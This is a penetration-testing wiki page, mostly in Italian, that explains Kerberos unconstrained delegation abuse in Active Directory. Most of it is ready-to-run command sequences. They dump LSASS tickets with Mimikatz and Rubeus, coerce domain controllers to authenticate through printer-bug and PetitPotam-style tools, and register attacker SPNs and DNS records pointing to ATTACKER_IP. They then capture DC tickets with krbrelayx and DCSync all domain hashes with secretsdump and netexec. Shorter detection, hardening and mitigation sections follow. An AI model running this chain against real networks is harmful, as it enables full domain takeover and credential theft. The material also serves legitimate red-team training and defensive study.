# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Questa è una funzionalità che un Domain Administrator può impostare su qualsiasi **Computer** all'interno del domain. Poi, ogni volta che un **user logins** nel Computer, una **copia del TGT** di quel user verrà **inviata dentro il TGS** fornito dal DC e **salvata in memoria in LSASS**. Quindi, se hai privilegi di Administrator sulla macchina, sarai in grado di **dump the tickets e impersonate the users** su qualsiasi macchina.

Quindi, se un domain admin logins in un Computer con la funzionalità "Unconstrained Delegation" attivata, e hai privilegi di local admin su quella macchina, sarai in grado di dump the ticket e impersonate il Domain Admin ovunque (domain privesc).

Puoi **find Computer objects with this attribute** controllando se l'attributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puoi farlo con un LDAP filter di ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, che è quello che fa powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Carica il ticket di Administrator (o della vittima) in memoria con **Mimikatz** o **Rubeus per un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Più info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Più informazioni su Unconstrained delegation su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Se un attacker è in grado di **compromettere un computer abilitato per "Unconstrained Delegation"**, potrebbe **ingannare** un **Print server** affinché esegua **automaticamente il login** contro di esso, **salvando un TGT** nella memoria del server.\
Poi, l'attacker potrebbe eseguire un **Pass the Ticket attack per impersonare** l'account del computer del Print server.

Per fare in modo che un print server esegua il login contro qualsiasi macchina puoi usare [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
If the TGT if from a domain controller, you could perform a [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Trova qui altri modi per **forzare un'autenticazione:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Qualsiasi altro primitive di coercion che faccia autenticare la vittima con **Kerberos** al tuo host con unconstrained-delegation funziona anche. Negli ambienti moderni questo spesso significa sostituire il classico flusso PrinterBug con **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** o coercion basata su **WebClient/WebDAV**, a seconda di quale superficie RPC sia raggiungibile.

### Abusing a user/service account with unconstrained delegation

L'unconstrained delegation non è **limitata agli oggetti computer**. Anche un **user/service account** può essere configurato come `TRUSTED_FOR_DELEGATION`. In quello scenario, il requisito pratico è che l'account debba ricevere i Kerberos service tickets per un **SPN di cui è proprietario**.

Questo porta a 2 percorsi offensivi molto comuni:

1. Comprometti la password/hash dell'**user account** con unconstrained-delegation, poi **aggiungi un SPN** a quello stesso account.
2. L'account ha già uno o più SPN, ma uno di essi punta a un **hostname obsoleto/dismesso**; ricreare il **DNS A record** mancante è sufficiente per dirottare il flusso di autenticazione senza modificare il set di SPN.

Flusso Linux minimale:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- Questo è particolarmente utile quando il principal unconstrained è un **service account** e hai solo le sue credenziali, non l'esecuzione di codice su un host joinato.
- Se l'utente target ha già uno **stale SPN**, ricreare il relativo **DNS record** può essere meno rumoroso che scrivere un nuovo SPN in AD.
- Le recenti tecniche Linux-centric usano `addspn.py`, `dnstool.py`, `krbrelayx.py` e un primitive di coercion; non è necessario toccare un host Windows per completare la chain.

### Abusing Unconstrained Delegation with an attacker-created computer

I domini moderni spesso hanno `MachineAccountQuota > 0` (default 10), consentendo a qualsiasi principal autenticato di creare fino a N computer objects. Se hai anche il token privilege `SeEnableDelegationPrivilege` (o diritti equivalenti), puoi impostare il computer appena creato come trusted for unconstrained delegation e raccogliere i TGT in ingresso da sistemi privilegiati.

High-level flow:

1) Create a computer you control
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Rendere risolvibile il fake hostname all'interno del dominio
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Abilita Unconstrained Delegation sul computer controllato dall'attaccante
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Perché funziona: con unconstrained delegation, l’LSA su un computer abilitato alla delegation memorizza in cache i TGT in ingresso. Se induci un DC o un server privilegiato ad autenticarsi sul tuo host falso, il suo machine TGT verrà salvato e potrà essere esportato.

4) Avvia krbrelayx in modalità export e prepara il materiale Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Forza l'autenticazione dal DC/dai server verso il tuo host falso
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx salverà file ccache quando una macchina si autentica, per esempio:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Usa il TGT della macchina DC catturato per eseguire DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Note e requisiti:

- `MachineAccountQuota > 0` abilita la creazione non privilegiata di computer; altrimenti servono diritti espliciti.
- Impostare `TRUSTED_FOR_DELEGATION` su un computer richiede `SeEnableDelegationPrivilege` (o domain admin).
- Assicurati la risoluzione dei nomi verso il tuo fake host (record DNS A) così il DC può raggiungerlo tramite FQDN.
- La coercion richiede un vettore valido (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, ecc.). Disabilitali sui DC, se possibile.
- Se l'account vittima è contrassegnato come **"Account is sensitive and cannot be delegated"** o è membro di **Protected Users**, il TGT inoltrato non sarà incluso nel service ticket, quindi questa chain non produrrà un TGT riutilizzabile.
- Se **Credential Guard** è abilitato sul client/server autenticante, Windows blocca **Kerberos unconstrained delegation**, il che può far fallire percorsi di coercion altrimenti validi dal punto di vista dell'operatore.

Idee di detection e hardening:

- Allerta su Event ID 4741 (computer account creato) e 4742/4738 (computer/user account modificato) quando UAC `TRUSTED_FOR_DELEGATION` è impostato.
- Monitora aggiunte insolite di record DNS A nella zona del dominio.
- Controlla picchi di 4768/4769 da host inattesi e autenticazioni del DC verso host non-DC.
- Limita `SeEnableDelegationPrivilege` a un set minimo, imposta `MachineAccountQuota=0` dove possibile e disabilita Print Spooler sui DC. Applica LDAP signing e channel binding.

### Mitigation

- Limita i logins di DA/Admin a servizi specifici
- Imposta "Account is sensitive and cannot be delegated" per gli account privilegiati.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
